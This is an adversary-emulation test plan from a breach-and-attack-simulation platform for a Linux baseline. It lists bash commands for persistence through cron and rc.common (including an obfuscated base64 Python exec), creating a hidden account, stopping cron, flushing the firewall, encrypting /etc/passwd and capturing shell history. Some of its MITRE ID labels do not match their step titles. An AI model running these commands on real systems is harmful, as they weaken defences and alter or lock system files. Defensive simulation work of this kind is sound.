# 2025-PA-P1-Linux-Baseline-v01

| | |
|---|---|
| **Status** | active |
| **Severity** | medium |
| **Target environment** | Linux |
| **Tags** | `linuxbaseline` · `linux` |
| **Autor** | Enddy Emmanuel Figueroa Perez |
| **Creado** | 2026-06-03T01:27:28.751Z |
| **Actualizado** | 2026-06-03T16:27:47.509Z |

## Plataformas BAS donde está disponible

- **Scythe** · ID: `aef9d2ca-7301-48ef-b2c9-4ac722a64046` · [ver](https://zgv2zwxzy3.saas.scythe.io/test-library/aef9d2ca-7301-48ef-b2c9-4ac722a64046)

## Steps

### 1. Local Account: T1136.001

**MITRE:** T1087.001

```bash
useradd -M -N -r -s /bin/bash -c UserServer phpuser
```

### 2. Network Service Discovery: T1046

**MITRE:** T1046

```bash
nmap -sS -p 80 127.0.0.1
telnet 127.0.0.1 80
nc -nv 127.0.0.1 80
```

### 3. Service Stop: T1489

**MITRE:** T1489

```bash
sudo systemctl stop cron
```

### 4. Data Encrypted for Impact: T1486

**MITRE:** T1486

```bash
openssl genrsa -out /tmp/key.pem 2048
openssl rsa -in /tmp/key.pem -pubout -out /tmp/pub.pem
openssl rsautl -encrypt -inkey /tmp/pub.pem -pubin -in /etc/passwd -out /tmp/passwd.zip
```

### 5. RC Scripts: T1037.004

**MITRE:** T1037.004

```bash
printf 'exit 0' | sudo tee -a /etc/rc.local
```

### 6. Cron: T1053.003

**MITRE:** T1053.003

```bash
echo "echo 'echo byppass edr allow' > /tmp/audit.log" > /etc/cron.daily/authentication
echo "echo 'echo byppass edr allow' > /tmp/audit.log" > /etc/cron.hourly/authentication
echo "echo 'echo byppass edr allow' > /tmp/audit.log" > /etc/cron.monthly/authentication
echo "echo 'echo byppass edr allow' > /tmp/audit.log" > /etc/cron.weekly/authentication
```

### 7. Local Groups: T1069.001

**MITRE:** T1069.001

```bash
if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;
if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;
if [ -x "$(command -v groups)" ]; then groups; else echo "groups is missing from the machine. skipping..."; fi;
if [ -x "$(command -v id)" ]; then id; else echo "id is missing from the machine. skipping..."; fi;
if [ -x "$(command -v getent)" ]; then getent group; else echo "getent is missing from the machine. skipping..."; fi;
cat /etc/group
```

### 8. Keylogging: T1056.001

**MITRE:** T1056.001

```bash
PS2=`logger -t "$USER" -f ~/.bash_history`
$PS2
tail /var/log/messages
```

### 9. Disable or Modify System Firewall: T1562.004

**MITRE:** T1686

```bash
iptables-save > /tmp/iptables.rules
iptables -F
```

### 10. System Owner/User Discovery: T1033

**MITRE:** T1033

```bash
users
w
who
```

### 11. RC Scripts: T1037.004

**MITRE:** T1037.004

```bash
filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi
printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common
echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGRsandkdXdkdXNiZ2JhZGF3aXVhanNsbmRhZ2JhaG1zZGFzZCByYy5jb21tb24gPiAvdG1wL3JldmVyc2UucmMuY29tbW9uJyk'))\"" | sudo tee -a /etc/rc.common
printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common
sudo chmod +x /etc/rc.common
```

---
_Exportado desde STRIKE — `linuxbaseline`_
